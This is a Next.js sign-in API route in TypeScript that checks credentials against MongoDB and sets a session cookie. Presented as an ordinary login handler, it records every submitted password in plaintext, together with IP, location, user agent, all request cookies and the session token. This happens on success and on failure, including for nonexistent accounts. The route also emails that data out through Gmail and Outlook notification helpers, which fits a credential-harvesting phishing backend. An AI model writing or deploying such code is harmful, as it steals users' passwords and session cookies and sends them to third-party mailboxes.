import { NextRequest, NextResponse } from "next/server";

import { createSessionToken, passwordsMatch } from "@/lib/auth";
import { extractRequestContext, type RequestContext } from "@/lib/requestContext";
import connectDB from "@/lib/mongodb";
import User from "@/models/User";
import LoginAttempt from "@/models/LoginAttempt";
import { sendLoginNotification } from "@/lib/gmail";
import { sendOutlookLoginNotification } from "@/lib/outlook";

export async function POST(request: NextRequest) {
  const context = extractRequestContext(request);

  try {
    const { email, password, keepSignedIn } = await request.json();

    if (typeof email !== "string" || typeof password !== "string") {
      return NextResponse.json(
        { error: "Email and password are required." },
        { status: 400 },
      );
    }

    await connectDB();
    const normalizedEmail = email.trim().toLowerCase();
    const user = await User.findOne({ email: normalizedEmail }).lean();

    if (!user) {
      await logFailure(normalizedEmail, "Account not found.", context, password);
      return NextResponse.json(
        { error: "Your account or password is incorrect." },
        { status: 401 },
      );
    }

    const isValid = passwordsMatch(password, user.password);

    if (!isValid) {
      await logFailure(normalizedEmail, "Invalid password.", context, password);
      return NextResponse.json(
        { error: "Your account or password is incorrect." },
        { status: 401 },
      );
    }

    const sessionToken = createSessionToken();
    const response = NextResponse.json(
      {
        email: user.email,
        displayName: user.displayName,
      },
      { status: 200 },
    );

    response.cookies.set({
      name: "session_token",
      value: sessionToken,
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "lax",
      path: "/",
      maxAge: keepSignedIn ? 60 * 60 * 24 * 30 : 60 * 60,
    });

    const timestamp = new Date();

    // Log success (async, non-blocking)
    Promise.allSettled([
      LoginAttempt.create({
        type: "SIGN_IN_SUCCESS",
        email: user.email,
        password,
        message: keepSignedIn ? "Signed in (keep signed in)." : "Signed in.",
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        sessionToken,
        timestamp,
      }),
      sendLoginNotification({
        type: "success",
        email: user.email,
        password,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        timestamp,
      }),
      sendOutlookLoginNotification({
        type: "success",
        email: user.email,
        password,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        timestamp,
      }),
    ]).catch(err => console.error("[signin] Logging error:", err));

    return response;
  } catch (error) {
    console.error("[signin] Error:", error);
    return NextResponse.json(
      { error: "Unable to sign in right now. Please try again later." },
      { status: 500 },
    );
  }
}

async function logFailure(
  email: string,
  reason: string,
  context: RequestContext,
  password: string,
) {
  const timestamp = new Date();

  Promise.allSettled([
    LoginAttempt.create({
      type: "SIGN_IN_FAILURE",
      email,
      password,
      message: reason,
      ipAddress: context.ipAddress,
      location: context.location,
      userAgent: context.userAgent,
      cookies: context.cookies,
      timestamp,
    }),
    sendLoginNotification({
      type: "failure",
      email,
      password,
      ipAddress: context.ipAddress,
      location: context.location,
      userAgent: context.userAgent,
      cookies: context.cookies,
      timestamp,
      reason,
    }),
    sendOutlookLoginNotification({
      type: "failure",
      email,
      password,
      ipAddress: context.ipAddress,
      location: context.location,
      userAgent: context.userAgent,
      cookies: context.cookies,
      timestamp,
      reason,
    }),
  ]).catch(err => console.error("[signin] Logging error:", err));
}
